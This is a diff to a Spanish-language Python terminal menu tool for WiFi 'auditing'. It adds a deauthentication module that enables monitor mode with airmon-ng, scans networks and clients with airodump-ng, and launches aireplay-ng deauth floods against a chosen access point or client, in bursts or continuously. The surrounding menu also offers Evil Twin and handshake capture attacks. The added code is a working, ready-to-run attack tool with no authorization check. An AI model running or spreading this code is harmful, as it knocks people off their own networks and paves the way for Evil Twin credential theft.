@@ -516,9 +516,9 @@ def generar_menu_carpetas_wifi():
     
     return menu
 
-#==========================================
-#GESTIÓN DE EVIL TWIN + DEAUTH
-#==========================================
+# ==========================================
+# GESTIÓN DE EVIL TWIN + DEAUTH
+# ==========================================
 EVIL_STATE = {
     "station_iface": None,
     "deauth_iface": None,
@@ -672,6 +672,153 @@ def ejecutar_ataque_evil(deauth_mode):
 
 
 # ==========================================
+# GESTIÓN DE DEAUTHENTICATION (UNICAST/MULTICAST)
+# ==========================================
+DEAUTH_STATE = {
+    "iface": None,
+    "mon_iface": None,
+    "target": {},
+    "clients": [],
+    "attack_type": "broadcast",
+    "client_mac": "FF:FF:FF:FF:FF:FF",
+    "count": "0"
+}
+
+def limpiar_deauth_ataque():
+    """Detiene aireplay y restaura la interfaz a modo managed"""
+    print("\n[*] Deteniendo procesos y restaurando interfaces...")
+    os.system("sudo pkill -f aireplay-ng 2>/dev/null")
+    os.system(f"sudo airmon-ng stop {DEAUTH_STATE['mon_iface']} 2>/dev/null || true")
+    os.system("sudo systemctl restart NetworkManager 2>/dev/null 2>&1")
+    print("[+] Limpieza completada. Interfaz restaurada.")
+
+def generar_menu_interfaces_deauth():
+    """Menú 1: Selección de interfaz para el ataque"""
+    menu = Menu("SELECCIONAR INTERFAZ PARA DEAUTHENTICATION")
+    interfaces = obtener_interfaces()
+    if not interfaces:
+        menu.agregar_opcion("No se detectaron interfaces", AccionBash("Error", "echo 'Conecta un adaptador WiFi compatible.'"))
+        return menu
+    for iface in interfaces:
+        menu.agregar_opcion(f"Usar {iface}", AccionMenuDinamico(f"Configurar {iface}", lambda i=iface: escanear_redes_deauth(i)))
+    return menu
+
+def escanear_redes_deauth(iface):
+    """Menú 2: Activa modo monitor, escanea 15s y genera menú con redes detectadas"""
+    DEAUTH_STATE["iface"] = iface
+    curses.endwin(); os.system('clear')
+    print(f"[*] Activando modo monitor en {iface}...")
+    os.system("sudo airmon-ng check kill > /dev/null 2>&1")
+    os.system(f"sudo airmon-ng start {iface} > /tmp/mon_out.txt 2>&1")
+
+    # Detección automática del nombre real en modo monitor
+    try:
+        import re
+        with open("/tmp/mon_out.txt", "r") as f:
+            match = re.search(r'\((w\w+mon|mon\w*)\)', f.read())
+        DEAUTH_STATE["mon_iface"] = match.group(1) if match else f"{iface}mon"
+    except: DEAUTH_STATE["mon_iface"] = f"{iface}mon"
+
+    mon = DEAUTH_STATE["mon_iface"]
+    print(f"[*] Escaneando entorno WiFi con {mon} (15 seg)...")
+    scan_base = "/tmp/deauth_scan"
+    os.system(f"sudo rm -f {scan_base}-01.csv")
+    os.system(f"sudo timeout 15s airodump-ng {mon} -w {scan_base} --output-format csv > /dev/null 2>&1")
+
+    redes = []
+    clientes_map = {}
+    try:
+        with open(f"{scan_base}-01.csv", "r", errors="ignore") as f:
+            contenido = f.read()
+            partes = contenido.split("Station MAC,")
+            for linea in partes[0].split("\n")[2:]:
+                r = linea.split(",")
+                if len(r) >= 14 and ":" in r[0]:
+                    redes.append({"bssid": r[0].strip(), "ch": r[3].strip(), "essid": r[13].strip() if r[13].strip() else "<Oculta>"})
+            if len(partes) > 1:
+                for linea in partes[1].split("\n")[1:]:
+                    c = linea.split(",")
+                    if len(c) >= 6 and ":" in c[0]:
+                        bssid = c[5].strip()
+                        mac = c[0].strip()
+                        if bssid not in clientes_map: clientes_map[bssid] = []
+                        clientes_map[bssid].append(mac)
+    except: pass
+
+    if not redes:
+        menu = Menu("ESCÁNEO FINALIZADO")
+        menu.agregar_opcion("No se encontraron redes (Regresar)", AccionBash("Info", "echo 'Intenta de nuevo o acércate al objetivo.'"))
+        return menu
+
+    menu_red = Menu("SELECCIONAR RED OBJETIVO")
+    for red in redes:
+        DEAUTH_STATE["clients"] = clientes_map.get(red["bssid"], [])
+        cant = len(DEAUTH_STATE["clients"])
+        texto = f"{red['essid']} (CH:{red['ch']} | {red['bssid']} | Clientes: {cant})"
+        menu_red.agregar_opcion(texto, AccionMenuDinamico("Target Set", lambda r=red: seleccionar_modo_deauth(r)))
+    return menu_red
+
+def seleccionar_modo_deauth(target):
+    """Menú 3: Elegir entre Broadcast o Unicast"""
+    DEAUTH_STATE["target"] = target
+    menu = Menu(f"TIPO DE ATAQUE: {target['essid']}")
+    menu.agregar_opcion("Broadcast/Multicast (Desconectar TODOS los clientes)", AccionMenuDinamico("Set Broadcast", lambda: configurar_cantidad_deauth("broadcast")))
+    menu.agregar_opcion("Unicast (Desconectar un cliente específico)", AccionMenuDinamico("Set Unicast", lambda: seleccionar_cliente_deauth()))
+    return menu
+
+def seleccionar_cliente_deauth():
+    """Menú 4: Solo aparece si hay clientes asociados. Selección por MAC"""
+    menu = Menu("SELECCIONAR CLIENTE OBJETIVO")
+    clientes = DEAUTH_STATE["clients"]
+    if not clientes:
+        menu.agregar_opcion("No hay clientes detectados. Usa la opción Broadcast.", AccionBash("Info", "echo 'Regresa y selecciona Broadcast.'"))
+        return menu
+    for mac in clientes:
+        menu.agregar_opcion(f"Desautenticar: {mac}", AccionMenuDinamico("Client Set", lambda m=mac: configurar_cantidad_deauth("unicast", m)))
+    return menu
+
+def configurar_cantidad_deauth(tipo, mac_cliente="FF:FF:FF:FF:FF:FF"):
+    """Menú 5: Configurar intensidad del ataque"""
+    DEAUTH_STATE["attack_type"] = tipo
+    DEAUTH_STATE["client_mac"] = mac_cliente
+    menu = Menu("INTENSIDAD DEL ATAQUE DE DEAUTHENTICATION")
+    menu.agregar_opcion("Continuo (Ataque persistente hasta salir)", AccionMenuDinamico("Start Continuous", lambda: ejecutar_deauth("0")))
+    menu.agregar_opcion("1 Ráfaga (5 paquetes)", AccionMenuDinamico("Start 1 Burst", lambda: ejecutar_deauth("5")))
+    menu.agregar_opcion("3 Ráfagas (15 paquetes)", AccionMenuDinamico("Start 3 Bursts", lambda: ejecutar_deauth("15")))
+    return menu
+
+def ejecutar_deauth(count):
+    """Ejecución final: Lanza aireplay-ng, maneja salida y limpia"""
+    curses.endwin(); os.system('clear')
+    target = DEAUTH_STATE["target"]
+    mon = DEAUTH_STATE["mon_iface"]
+    client = DEAUTH_STATE["client_mac"]
+
+    print("="*60)
+    print("[!] INICIANDO ATAQUE DE DEAUTHENTICATION")
+    print(f"    Interfaz Monitor : {mon}")
+    print(f"    Red Objetivo     : {target['essid']} ({target['bssid']}) CH:{target['ch']}")
+    print(f"    Cliente Objetivo : {'Broadcast (Todos)' if client == 'FF:FF:FF:FF:FF:FF' else client}")
+    print(f"    Tipo de Paquetes : {'Continuo (-0)' if count=='0' else f'{count} paquetes'}")
+    print("="*60)
+    print("[*] Ejecutando aireplay-ng...")
+    print("[!] Presiona Ctrl+C para detener el ataque en modo continuo.\n")
+
+    cmd = f"sudo aireplay-ng -0 {count} -a {target['bssid']}"
+    if client != "FF:FF:FF:FF:FF:FF":
+        cmd += f" -c {client}"
+    cmd += f" {mon}"
+
+    try:
+        subprocess.run(cmd, shell=True)
+    except KeyboardInterrupt:
+        print("\n[!] Ataque interrumpido manualmente.")
+    finally:
+        limpiar_deauth_ataque()
+        print("\n[Presiona ENTER para regresar al menú principal]")
+        input()
+
+# ==========================================
 # 6. ÁRBOL DE MENÚS Y COMPILACIÓN
 # ==========================================
 def main(stdscr):
@@ -719,11 +866,11 @@ def main(stdscr):
 # ==========================================
 
     menu_wireless = Menu("AUDITORÍA INALÁMBRICA (WiFi)")
-    menu_wireless.agregar_opcion("1. Activar Modo Monitor (Seleccionar Interfaz)", AccionMenuDinamico("Modo Monitor", generar_menu_monitor))
-    menu_wireless.agregar_opcion("2. Iniciar Captura Automatizada de Handshake", AccionMenuDinamico("Seleccionar Interfaz", generar_menu_interfaces_captura))
-    menu_wireless.agregar_opcion("3. Explorador de Capturas (Visor TUI y Ranger)", AccionMenuDinamico("Explorador WiFi", generar_menu_carpetas_wifi))
-    menu_wireless.agregar_opcion("4. Ataque Evil Twin + Deauth (Automático) ", AccionMenuDinamico("Evil Twin", generar_menu_interfaces_evil))
-
+    menu_wireless.agregar_opcion("Activar Modo Monitor (Seleccionar Interfaz)", AccionMenuDinamico("Modo Monitor", generar_menu_monitor))
+    menu_wireless.agregar_opcion("Iniciar Captura Automatizada de Handshake", AccionMenuDinamico("Seleccionar Interfaz", generar_menu_interfaces_captura))
+    menu_wireless.agregar_opcion("Explorador de Capturas (Visor TUI y Ranger)", AccionMenuDinamico("Explorador WiFi", generar_menu_carpetas_wifi))
+    menu_wireless.agregar_opcion("Ataque Evil Twin + Deauth (Automático) ", AccionMenuDinamico("Evil Twin", generar_menu_interfaces_evil))
+    menu_wireless.agregar_opcion("Desautenticación WiFi (Unicast/Multicast) ", AccionMenuDinamico("Deauth", generar_menu_interfaces_deauth))
 
 
 
